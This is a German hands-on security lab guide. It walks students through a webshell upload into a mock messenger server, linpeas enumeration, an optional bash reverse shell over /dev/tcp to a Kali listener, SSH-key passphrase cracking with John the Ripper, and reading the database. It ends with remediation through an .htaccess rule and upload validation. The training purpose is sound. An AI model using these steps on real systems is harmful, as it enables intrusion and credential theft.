# Übungsanleitung

## Allgemeines / Angriff

### Webshell

Webshells sind Skripte die, wenn sie auf einen Webserver eingeschleust werden, einen Fernzugriff (Backdoor) für einen/eine Angreifer/-in darstellen. Eine Webshell kann in jeder Programmiersprache (z.B. ASP, PHP, JSP, Python, Ruby, C++, usw.) geschrieben sein, der Zielserver sollte jedoch die Sprache unterstützen, damit die Webshell ausgeführt werden kann. Webshells können in verschiedenen Formen auftreten, eine beliebte Form ist z.B. eine Datei mit nur einer beliebig Langen Zeile, die dazu noch bspw. base64 codiert ist. Diese Art von Formatierung verschleiert den Code und erschwert dem/der Leser/-in der Datei den Code zu verstehen und als Webshell zu enttarnen.

Die Webshell dient in den meisten Fällen als Einstiegspunkt um Befehle auszuführen und um die damit verbundenen Möglichkeiten auszunutzen, wie etwa die Privilegien-Eskalation (Zugriff verschaffen auf Ressourcen die normalerweise erweiterte Berechtigungen erfordern), weitere Dateien hochzuladen, sensible Daten zu stehlen, Create, Read, Update und Delete-Operatoren durchzuführen oder auch um Programme auszuführen.

Durch den Einsatz von Netzwerkwerkzeugen können Angreifer/-innen Schwachstellen innerhalb eines Webservers finden und diese Sicherheitslücken gezielt auszunutzen, um ihre Webshell auf den Webserver zu transferieren. Sicherheitslücken wie das Einbinden von nicht validierten Codes in die Webanwendung (Cross-Site-Scripting) oder durch eine nicht validierte Dateiupload Funktion, wie es in dieser Übung der Fall, ist können dazu genutzt werden, um die Webshell zu platzieren.

### **Webshell** **(Skript)**

Eine base64 und in eine Zeile formatierte PHP-Datei. Enthält den Code um den Angriff für diese Übung durchzuführen.

### Allgemeine Programme

- **OpenSSH-Server**
    
    SSH (Secure Shell) ist ein Internetprotokoll und dient dem sicheren Zugriff auf entfernte Rechner. Über SSH kann eine 
    Terminalsitzung geöffnet werden, aber auch Daten sicher kopiert werden.
    
    OpenSSH ist ein Programmpaket für die Remoteanmeldung via SSH-Protokoll
    
    Je nach Konfiguration können verschieden Authentifizierungsmöglichkeiten verwendet werden, u.a. die Zwei-Faktor-Authentisierung oder dem Public-Private-Key Verfahren.  
    
- **Nano**
    
    Ein Texteditor, welches die Bearbeitung von Dateien im Terminal ermöglicht
    

### Angreifer/-in

- **w3af**
    
    Open-Source-Sicherheitsscanner für Webanwendungen. Ermöglicht mittels Plug-Ins das Scannen einer Webanwendung mit verschiedenen Modulen. 
    
- **Kali Linux**
    
    Eine auf Debian basierte Linux Distribution. Kali Linux stellt Programme für Penetrationstest zur Verfügung. Die auf dieser Distribution installierten Programme unterstützen den/die Angreifer/-in, in dieser Übung bei dem Webshell-Angriff.
    
    - **Netcat**
        
        Netcat, kurz nc, ist ein universelles Kommandozeilenwerkzeug. Es kann im Terminal oder in Skripten für die Kommunikation über TCP- und UDP-Netzwerkverbindungen (IPv4 und 6), aber auch lokale UNIX Domain Sockets genutzt werden.
        
    - **John The Ripper**
        
        Ist eine Software um Passwörter zu entschlüsseln.
        
        ssh2john.py [**Schlüssedatei**] > [**Zieldatei**] wird in dieser Übung genutzt um die Passphrase für einen privaten Schlüssel herauszufinden.
        
    - **Wordlist**
        
        Zu dt. Passwörterliste ist eine Liste an Wörtern, die meist in Verbindung mit dem Wörterbuchangriff genutzt werden, um Passwörter zu knacken. Die hier verwendete Wörterliste ist rockyou.txt.
        

### Server Seite

- **Webserver**
    
    Ziel des Webshell-Angriffs. 
    
    Stellt einen Mock-up eines **Messenger** zur Verfügung.
    
    Der Server enthält mehrere Benutzer/-innen und eine Datenbankschnittstelle.
    
    Der Server persistiert die hochgeladenen Dateien.
    
    Das Layout des Dateisystems sieht folgendermaßen aus:
    
    - /**var/www/html**:
        
        Hier liegen die Verzeichnisse und Dateien um die Webapplikation darzustellen
        
    - **/etc**:
        
        Enthält Konfigurationsdateien, z.B. die Dateien **passwd** (Informationen über alle Benutzerkonten) und **shadow** (enthält die verschlüsselten Passwörter der Benutzer bzw. Benutzerinnen)
        
    - **/home**:
        
        Enthält Homeverzeichnisse. Das Homeverzeichnis für den root Benutzer bzw. Benutzerin ist unter /root zu finden.
        
- **Webapplikation**
    
    Eine statische Webseite, ohne Caching. Ein neu laden der Seite setzt alle an der Webapplikation vorgenommen Änderungen zurück (geschriebene Nachrichten werden nicht persistiert).
    
    Beinhaltet eine Dateiupload-Funktion.
    
    Der erste angezeigte Chat beinhaltet ein bereits auf den Server hochgeladenes Bild.
    
- **Datenbank**
    
    Eine MySQL-Datenbank. Enthält Daten über die Nachrichtenapplikation.
    

### Hilfreiche Unix Befehle

- **bash [Option] [Befehl]**: Führt ein Befehl in der Bash Konsole aus
    - bash -c "<-Befehl>"
    - bash ./<ausführbare_datei>
- **ls [Option]**: Steht für "list", zeigt den Inhalt eines Verzeichnisses an
    - ls -l —> zeigt weitere Informationen zum Inhalt an (z.B. Dateirechte)
    - ls -la —> zeigt auch versteckte Dateien (z.B. Dateien die mit einem "." beginnen)
    - ls -R —> zeigt rekursiv auch den Inhalt von Unterordnern an
- **cd [Verzeichnis(-Pfad)]**: Steht für "change directory", z.dt. "Verzeichnis wechseln"
    - cd .. —> wechselt bspw. in das übergeordnete Verzeichnis
- **cat [Datei(-Pfad)]**: Kann dazu genutzt werden um den Inhalt einer Datei auszugeben
- **./<Datei>**: Führt die Datei aus
- **chmod [Option] [Ziel]:** Verändert Zugriffsrechte für Verzeichnisse und Dateien
    - chmod +x [Ziel] —> Fügt die Berechtigung zum Ausführen hinzu
- **wc [Option] [Datei]:** Steht für "word count", zählt Wörter, Zeichen und Bytes
    - wc -l  [Datei] ****—> zählt die Zeilen in der Datei
    - wc -w  [Datei] ****—> zählt die Wörter in der Datei
- **rm** **[Option]** **[Datei/Verzeichnis]**: Löscht eine Datei oder ein Verzeichnis
    - rm [Datei] —> löscht eine Datei
    - rm -rf [Verzeichnis] —> löscht Verzeichnis rekursiv und ohne Nachfrage

## Aufbau der Übung

In dieser Übung werden Sie verschiedene Perspektiven einnehmen. Die "normalen" Nutzer/-innen (Einführung), die die Webanwendung als Nachrichtenapplikation nutzen. Die Angreifer/-innen Perspektive (Webshell-Angriff), die einen Angriff auf den Webserver durchführen und schlussendlich die Perspektive eines/r Serveradministrator/-in, welche die Sicherheitslücke behebt.

### Einführung

Öffnen Sie die Webseite "localhost:8080" in einem Browser Ihrer Wahl, in dem Sie die genannte URL in die Suchleiste eingeben. Machen Sie sich mit der Webseite und deren Funktionen vertraut. 

```bash
💡 Mit Hilfe der Netzwerkanalyse aus den eingebauten Entwicklerwerkzeugen des Browsers können HTTP Anfragen und Antworten der Webseite verfolgt werden.
```

👤 **(Perspektive: Anwender/-in)**

Laden Sie vorerst einmal eine normale Bilddatei hoch, in dem Sie unten links in der Chatleiste auf die Büroklammer klicken. Es erscheint ein grauer Screen. Drücken Sie erneut auf die Büroklammer um ein Bild auszuwählen. Mit einem Klick auf den Papierflieger lässt sich das Bild hochladen.

### Webshell-Angriff

1. **Schritt:** 😈 **(Perspektive: Angreifer/-in)**
    
    Loggen Sie sich in den w3af Container und führen Sie das Skript **w3af_console** aus, indem Sie folgenden Befehl 
    
    ```bash
    ./w3af_console
    ```
    
    im Terminal ausführen. 
    
    Mit dem Befehl 
    
    ```bash
    help [Option]
    ```
    
    werden Ihnen die verschiedenen Befehle und deren Beschreibung von w3af angezeigt. Die drei Befehle, die Sie in dieser Übung verwenden werden sind **Plug-Ins**, **target** und **start**.
    
    Geben Sie **Plug-Ins** in das Terminal ein, Sie sollten nun in der Plug-Ins Oberfläche sein. Mit einer weiteren Eingabe von **help** werden Ihnen die verschieden Scanmodule angezeigt. Aktivieren Sie die Module **web_spider** und **file_upload**, in dem Sie die Befehle 
    
    ```bash
    crawl web_spider
    ```
    
    und 
    
    ```bash
    grep file_upload
    ```
    
    nacheinander ausführen.
    
    Mit **back** gelangen Sie wieder in die vorherige Oberfläche.
    
    Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als Ihr Ziel. 
    
    Dafür müssen Sie den Befehl **target** eingeben, gefolgt von dem Befehl
    
    ```bash
    set target http://<local_ip_adresse>:8080
    ```
    
    Mit der Eingabe von **view** lassen sich die Ziele einsehen.
    
    Kehren Sie wieder in die ursprüngliche Oberfläche zurück (**back**) und starten Sie den Scan über den Befehl **start.**
    
    Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen: 
    
    - Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;
    - Welche URLs existieren für die Ziel Webanwendung und wo werden eventuell von dem/der Benutzer/-in hochgeladene Dateien abgespeichert
    
    beantworten.
    
2. **Schritt:** 😈 **(Perspektive: Angreifer/-in)**
    
    Laden Sie die Webshell (webshell.php) über die Upload Funktion der Webseite auf den Webserver und öffnen Sie das Skript über den Browser, indem Sie in der Suchleiste die URL 
    
    ```
    [localhost:8080](http://localhost:8080)/[storage_path]/[file_name] 
    ```
    
    eingeben. Das Passwort um für die Autorisierung der Webshell ist: "**j~82BQC\;3N<`HK~**".
    
    Sammeln Sie Informationen über den Server, indem Sie die oben genannten **Unix Befehle** verwenden um sich durch das Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im Abschnitt **Server Seite,** unter **Allgemeines / Angriff,** des Dateisystems oben beschrieben.
    
    Um die Informationssuche zu automatisieren können Sie das Skript **linpeas.sh** hochladen und ausführen. Sie können das Skript auch über die Webseite hochladen oder die Upload-Funktion der Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden zum ausführen des Skriptes.
    
    ```bash
    bash ./linpeas.sh
    ```

    ````bash  
    💡 Optional - Reverse Shell: 
    Loggen Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname -i ausgeben. 
    Anschließend können Sie den Befehl nc -lnvp [port] ausführen. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. 
    Sende Senden Sie den Befehl 
   
    bash -c "bash -i >& /dev/tcp/[client_ip]/[port] 0>&1"
   
    über die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und übergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal.  
    Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden 
    sein. Nun können Sie statt im Browser über eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausführung auf der Reverse Shell 
    koloriert bzw. formatiert angezeigt.
    ````
    
    linpeas.sh gibt Ihnen interessante Informationen, wie Systeminformationen, gefundene Dateien von Relevanz und andere nützliche Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in einem Terminal ausgeben lassen). 
    
    Suchen Sie in der Ausgabe nach Authentifizierungsinformation für die Datenbank und Schlüssel für eine SSH Verbindung.
    
    Lokalisieren Sie das SSH Verzeichnis, des Eigentümers der Schlüssel und überprüfen Sie die Rechte der Dateien. Kopieren Sie sich den privaten Schlüssel
    
    Öffnen Sie im Kali Linux Container ein Terminal um eine SSH Verbindung zum Webserver herzustellen. 
    
    ```bash
    ssh <username>@<webserver_ip_adress>
    ```
    
    Die SSH Verbindung scheint passwortgeschützt zu sein. 
    
3. **Schritt:** 😈 **(Perspektive: Angreifer/-in)**
    
    In diesem Schritt werden Sie das Passwort des privaten Schlüssels knacken.
    
    Erstellen Sie dafür eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali Linux Container und fügen Sie den vom Webserver kopierten Schlüssel in die erstellte Datei ein. Navigieren Sie hierfür in das Homeverzeichnis.
    
    ```bash
    cd /home && nano <ssh_username>.id_rsa
    ```
    
    Das Programm John The Ripper kann die Schlüsseldatei nicht direkt verarbeiten. Deshalb muss der Schlüssel zuerst in einen Hash umgewandelt werden, den John The Ripper interpretieren kann.
    
    Nutzen Sie dafür ssh2john.py. Mit dem Befehl 
    
    ```bash
    python ssh2john.py [<ssh_username>.id_rsa] > [<ssh_username>.hash] 
    ```
    
    wird eine Datei, welche einen kryptografisch verschlüsselten Schlüssel enthält, in einen Hash umgewandelt und in die zweite Datei geschrieben.
    
    ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt [hash_file]
    ```
    
    Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut sich über SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung sehen Sie das Terminal des Webservers.
    
4. **Schritt:** 😈 **(Perspektive: Angreifer/-in)**
    
    In letzten Schritt der Angreifer/-innen Perspektive werden Sie versuchen Daten aus der Datenbank zu lesen.
    
    Verbinden Sie sich mit der Datenbank, indem Sie die Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl einfügen und ausführen. 
    
    ```bash
    mysql -u [username] -p -h [host_name] [database_name]
    ```
    
    Geben Sie das Passwort bei der Aufforderung ein und bestätigen Sie dies mit der Enter-Taste.
    
    Nützliche SQL-Befehle: 
    
    ```sql
    SHOW TABLES;
    SELECT * FROM [database_name].[table_name];
    
    // Die Funktionen ST_X(position) und ST_Y(position) ... wandelt das Attribut  
    // "position" in latitude und longitude (Koordinaten) um
    // z.B. SELECT ST_X(position), ST_Y(position) FROM [table_name]
    
    // Weitere Abfragen finden Sie in den Dateien, in dem die 
    // Authentifizierungsinformation gefunden wurden.
    ```
    
    Mit **exit** verlassen Sie die MySQL Oberfläche wieder.
    

### Behebung der Sicherheitslücke

🛠️ **(Perspektive: Serveradministrator/-in)**

Im finalen Schritt dieser Übung wechseln Sie in die Rolle eines/r Serveradministrator/-in.

Wichtig ist es, dass die hier gezeigten Maßnahmen unvollständig sind um einen ausreichenden Schutz gegenüber dieser Sicherheitslücke zu gewähren. Die Maßnahmen sind jedoch ausreichend für den Anwendungsfall dieser Übung. 

1. **Maßnahme** 
    
    Erstellen Sie eine .htaccess Datei mit unten angeführtem Inhalt
    
    ```bash
    nano /var/www/html/public/uploads/images/.htaccess
    ```
    
    Inhalt der .htaccess Datei:
    
    ```
    RemoveHandler .php .phtml .php3
    RemoveType .php .phtml .php3
    php_flag engine off
    ```
    
    Die htaccess Datei ist eine Konfigurationsdatei für einen Apache Server. Sie enthält Konfigurationen und Regeln bezüglich des Verzeichnisses. Die htaccess Datei wird bei jeder Anfrage an den Server ausgewertet und angewandt.
    
    Probieren Sie die Webshell noch einmal über den Browser aufzurufen.
    
    Der Inhalt der Datei verhindert das Ausführen von .ph* (PHP) Dateien in dem Verzeichnis.  
    
2. **Maßnahme**
    
    Eine unkontrollierte Dateiupload Funktion kann wie Sie in den vorherigen Schritten gesehen haben, unkontrollierte Auswirkungen haben. Deshalb werden Sie in diesem Schritt eine Dateiupload Validierung einfügen.
    
    Lokalisieren Sie hierfür die Datei **upload.php** im Verzeichnis **/var/www/html/php.** 
    
    Bearbeiten Sie diese Datei mit **nano.**
    
    Lokalisieren Sie die Zeilen: 
    
    ```php
    uploadUnSanitized($fileStorage, $fileName, $tmpFileName);
    // uploadSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    Kommentieren Sie die Funktion 
    
    ```php
    uploadUnSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    aus und die Funktion 
    
    ```php
    uploadSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    ein (**"//"** vor der Funktion entfernen/setzten).
    
    In der uploadSanitized()-Funktion wird der mimeType (Dateityp z.B. image/jpeg), welcher über die HTTP-Anfrage gesetzt wird, geprüft und validiert. Bei erfolgreicher Validierung (Dateityp ist ein Bildformat) wird der Dateiname und Dateiendung neu gesetzt und anschließend wird die Datei abgespeichert. 
    
    Der Webserver antwortet mit einem **HTTP 200 OK** beim erfolgreichen hochladen einer validen Datei und ein **HTTP 400 Bad Request** beim Hochladen einer nicht validen Bilddatei.
    
    Löschen Sie nun die von Ihnen hochgeladene Webshell und linpeas.sh Skript. 
    
    Die Sicherheitslücke ist für den Anwendungsfall dieser Übung gestoppt. 
    

### **Erneuter Angriffsversuch**

😈 **(Perspektive: Angreifer/-in)**

Probieren Sie die Webshell noch einmal über den Browser hochzuladen.

Der Webserver sollte Ihnen das hochladen einer nicht validen Datei verwehren.

**Sie haben nun das Ende der Übung erreicht.** 🎊